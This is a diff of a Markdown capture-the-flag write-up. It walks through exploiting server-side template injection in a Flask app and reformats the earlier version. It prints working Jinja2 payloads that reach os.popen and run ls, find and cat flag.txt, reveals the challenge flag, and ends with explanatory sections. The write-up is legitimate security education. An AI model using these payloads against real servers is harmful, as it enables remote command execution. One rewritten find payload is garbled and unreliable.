@@ -82,76 +82,49 @@
  [The challenege website](https://garfield-fun.challenge.uscctf.org)
  ![Garfield Fun](../assets/Garfield_1.png)
 
- Payload:
- /mylabs?word_5={{7*7}}
- [URL](https://garfield-fun.challenge.uscctf.org/mylabs?word_5=%7B%7B7*7%7D%7D)
-
- Output:
- 49
- [SSTI_Confirmed](../assets/Garfield_1.png)
-
+ Payload:/mylabs?word_5={{7*7}}
+ ![SSTI_Confirmed](../assets/Garfield_1.png)
+ Output:49
  This confirms that SSTI exists.
 
  ---
+ ### Exploring the Environment
+ Payload:/mylabs?word_5={{config}}
+ ![Config output](../assets/Garfield_2.png)
+ This showed the Flask config object, but SECRET_KEY was None, so it was not useful.
 
-## Exploring the Environment
+ ---
 
-Payload:
-/mylabs?word_5={{config}}
+ ### Listing Files
 
-URL: https://garfield-fun.challenge.uscctf.org/mylabs?word_5=%7B%7B%20config%20%7D%7D
+ Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
+ ![ls output](../assets/Garfield_3.png)
 
-![Config output](../assets/images/garfield-ssti/step2-config.png)
+ ---
 
-This showed the Flask config object, but SECRET_KEY was None, so it was not useful.
+ ### Searching for the Flag
 
----
+ Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
 
-## Gaining Code Execution
+ ![find output](../assets/Garfield_4.png)
 
-Payload:
-/mylabs?word_5={{cycler.__init__.__globals__}}
+ This revealed the presence of flag.txt.
 
-This confirmed that I could access Python internals.
+ ---
 
----
-
-## Listing Files
-
-Payload:
-/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
-
-![ls output](../assets/images/garfield-ssti/step3-ls.png)
+ ### Reading the Flag
+ Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
+ ![flag output](../assets/Garfield_5.png)
 
 ---
 
-## Searching for the Flag
+### Flag
 
-Payload:
-/mylabs?word_5={{cycler.__init__.__globals__.os.popen('find . -maxdepth 2 -type f').read()}}
-
-![find output](../assets/images/garfield-ssti/step4-find.png)
-
-This revealed the presence of flag.txt.
+    uscctf{ssti_rules_mwahaha}
 
 ---
 
-## Reading the Flag
-
-Payload:
-/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
-
-![flag output](../assets/images/garfield-ssti/step5-flag.png)
-
----
-
-## Flag
-
-uscctf{ssti_rules_mwahaha}
-
----
-
-## Why SSTI is Dangerous
+### Why SSTI is Dangerous
 
 SSTI can allow attackers to:
 
@@ -164,7 +137,7 @@ In this challenge, it allowed command execution and reading the flag file.
 
 ---
 
-## Root Cause
+### Root Cause
 
 The vulnerability exists because:
 
@@ -176,13 +149,6 @@ This means user input is treated as code.
 
 ---
 
-## Final Thought
+### Final Thought
 
 This challenge shows how dangerous it is to render user-controlled input inside templates. Even a small mistake can lead to full server compromise.  
-
-
-
-  
-  
-      
-      
